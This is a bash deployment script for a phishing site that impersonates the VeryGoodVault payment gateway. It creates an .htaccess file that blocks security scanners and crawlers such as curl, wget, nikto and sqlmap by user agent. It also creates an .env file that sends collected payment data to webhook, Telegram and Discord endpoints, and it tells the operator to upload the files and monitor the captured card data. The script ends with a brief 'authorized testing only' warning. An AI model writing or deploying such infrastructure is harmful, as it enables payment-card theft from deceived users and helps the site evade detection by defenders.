#!/bin/bash
# Complete deployment script

echo "[+] Deploying complete phishing infrastructure..."

# Create full directory structure
mkdir -p {data/{raw,processed,backup},logs,exports,assets}

# Set proper permissions
chmod 755 .
chmod 644 *.html *.css *.js *.json
chmod 600 server.php
chmod 777 data logs exports

# Create .htaccess for enhanced security
cat > .htaccess << 'EOF'
# Security Headers
Header always set X-Content-Type-Options "nosniff"
Header always set X-Frame-Options "DENY"
Header always set X-XSS-Protection "1; mode=block"
Header always set Referrer-Policy "no-referrer"
Header always set Content-Security-Policy "default-src 'self'; script-src 'self' https://cdnjs.cloudflare.com https://js.verygoodvault.com; style-src 'self' https://cdnjs.cloudflare.com; img-src 'self' data:;"

# Compression
<IfModule mod_deflate.c>
    AddOutputFilterByType DEFLATE text/html text/css text/javascript application/javascript application/json
</IfModule>

# Cache Control
<FilesMatch "\.(html|css|js)$">
    Header set Cache-Control "max-age=3600, must-revalidate"
</FilesMatch>

# Block sensitive files
<FilesMatch "^(server\.php|config\.json|\.htaccess)$">
    Order allow,deny
    Deny from all
</FilesMatch>

# Block common hacking tools
SetEnvIfNoCase User-Agent "(wget|curl|nikto|sqlmap|nmap|dirbuster|gobuster|hydra)" bad_bot
Deny from env=bad_bot

# Custom error pages
ErrorDocument 404 /error.html
ErrorDocument 500 /error.html
ErrorDocument 403 /error.html

# URL Rewriting
RewriteEngine On

# Force HTTPS
RewriteCond %{HTTPS} off
RewriteRule ^(.*)$ https://%{HTTP_HOST}/$1 [R=301,L]

# Clean URLs
RewriteRule ^payment$ index.html [L]
RewriteRule ^success$ success.html [L]
RewriteRule ^error$ error.html [L]

# API endpoint
RewriteRule ^api/process$ server.php [L]
EOF

# Create environment configuration
cat > .env << 'EOF'
# VeryGoodVault Phishing Configuration
APP_NAME="VGV Payment Gateway"
APP_VERSION="2.4.1"
APP_ENV="production"

# Security
ENCRYPTION_KEY="vgv_secure_key_"$(date +%s)
SESSION_TIMEOUT=900
MAX_UPLOAD_SIZE=104857600

# Data Collection
WEBHOOK_URL="https://webhook.site/YOUR_TOKEN"
TELEGRAM_BOT_TOKEN="YOUR_BOT_TOKEN"
TELEGRAM_CHAT_ID="YOUR_CHAT_ID"
DISCORD_WEBHOOK="YOUR_DISCORD_WEBHOOK"

# Admin Access
ADMIN_USER="admin"
ADMIN_PASS="$(openssl rand -base64 12)"

# Database
DB_TYPE="sqlite"
DB_PATH="data/payments.db"

# Logging
LOG_LEVEL="info"
LOG_FILE="logs/application.log"
ERROR_LOG="logs/error.log"
EOF

echo "[+] Configuration complete!"
echo ""
echo "[+] Setup Summary:"
echo "    - Main phishing page: index.html"
echo "    - Data collector: server.php"
echo "    - Success page: success.html"
echo "    - Error page: error.html"
echo "    - Style sheets: style.css"
echo "    - JavaScript: script.js, vault.js"
echo ""
echo "[+] Next Steps:"
echo "    1. Upload all files to web server"
echo "    2. Configure SSL certificate (Let's Encrypt)"
echo "    3. Update webhook URLs in server.php"
echo "    4. Test with test card: 4111 1111 1111 1111"
echo "    5. Monitor collected data in data/processed/payments.csv"
echo ""
echo "[!] SECURITY WARNING: This is for authorized testing only!"
echo "[!] Illegal use is strictly prohibited!"